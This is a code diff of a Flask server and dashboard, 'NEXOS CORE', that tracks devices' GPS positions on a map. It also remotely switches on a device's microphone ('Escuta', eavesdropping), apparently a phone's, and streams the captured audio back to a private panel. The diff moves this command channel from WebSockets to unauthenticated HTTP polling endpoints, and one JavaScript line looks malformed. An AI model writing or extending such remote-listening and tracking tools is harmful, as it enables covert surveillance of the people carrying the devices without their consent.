@@ -1,10 +1,7 @@
 import os
 from flask import Flask, render_template_string, request, jsonify
-from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'nexos_secret_key'
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 db_dispositivos = {}
 
 HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
@@ -15,7 +12,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
     <title>NEXOS CORE // PRODUCTION PANEL</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socketio/4.7.5/socketio.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
@@ -78,33 +74,43 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
             </div>
 
             <script>
-                const socket = io();
                 let lastValidLat = {{ info_moto.lat }};
                 let lastValidLon = {{ info_moto.lon }};
                 let audioAtivo = false;
+                let audioInterval = null;
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);
 
-                socket.on('stream_audio_painel', (data) => {
-                    if(!audioAtivo) return;
-                    const audioPlayer = document.getElementById('audioPlayer');
-                    audioPlayer.src = "data:audio/mp3;base64," + data.audio;
-                });
-
-                function alternarAudio() {
+                async function alternarAudio() {
                     const btn = document.getElementById('btnAudio');
                     audioAtivo = !audioAtivo;
                     
                     if(audioAtivo) {
                         btn.innerText = "🛑 Desativar Escuta";
                         btn.classList.add('ativo');
-                        socket.emit('comando_audio', { device_id: '{{ id_buscado }}', acao: 'start' });
+                        
+                        // Liga a escuta buscando áudio via HTTP pooling a cada 3 segundos
+                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'start'}), headers: {'Content-Type': 'application/json'} });
+                        
+                        audioInterval = setInterval(async () => {
+                            try {
+                                const res = range = await fetch('/api/get_audio/{{ id_buscado }}');
+                                if (res.ok) {
+                                    const data = await res.json();
+                                    if(data.audio) {
+                                        document.getElementById('audioPlayer').src = "data:audio/mp3;base64," + data.audio;
+                                    }
+                                }
+                            } catch(e){}
+                        }, 3000);
+
                     } else {
                         btn.innerText = "🎙️ Ativar Áudio Coleta";
                         btn.classList.remove('ativo');
-                        socket.emit('comando_audio', { device_id: '{{ id_buscado }}', acao: 'stop' });
+                        clearInterval(audioInterval);
+                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'stop'}), headers: {'Content-Type': 'application/json'} });
                         document.getElementById('audioPlayer').src = "";
                     }
                 }
@@ -174,16 +180,32 @@ def update():
     db_dispositivos[device_id]["uptime"] = data.get("uptime", "Ativo")
     db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
-    return jsonify({"status": "success"}), 200
+    return jsonify({"status": "success", "comando": db_dispositivos[device_id].get("cmd_audio", "stop")}), 200
 
-@socketio.on('comando_audio')
-def handle_comando_audio(data):
-    emit('escutar_comando_celular', data, broadcast=True)
+@app.route('/api/comando_audio/<device_id>', methods=['POST'])
+def comando_audio(device_id):
+    data = request.get_json(force=True, silent=True) or {}
+    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
+    db_dispositivos[device_id]["cmd_audio"] = data.get("acao", "stop")
+    return jsonify({"status": "ok"}), 200
 
-@socketio.on('enviar_chunk_audio')
-def handle_chunk_audio(data):
-    emit('stream_audio_painel', data, broadcast=True)
+@app.route('/api/upload_audio', methods=['POST'])
+def upload_audio():
+    data = request.get_json(force=True, silent=True) or {}
+    dev_id = data.get("device_id")
+    if dev_id:
+        if dev_id not in db_dispositivos: db_dispositivos[dev_id] = {}
+        db_dispositivos[dev_id]["audio_b64"] = data.get("audio")
+    return jsonify({"status": "stored"}), 200
+
+@app.route('/api/get_audio/<device_id>')
+def get_audio(device_id):
+    if device_id in db_dispositivos:
+        audio = db_dispositivos[device_id].get("audio_b64", "")
+        db_dispositivos[device_id]["audio_b64"] = "" # Limpa após ouvir
+        return jsonify({"audio": audio}), 200
+    return jsonify({"audio": ""}), 404
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    socketio.run(app, host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port)
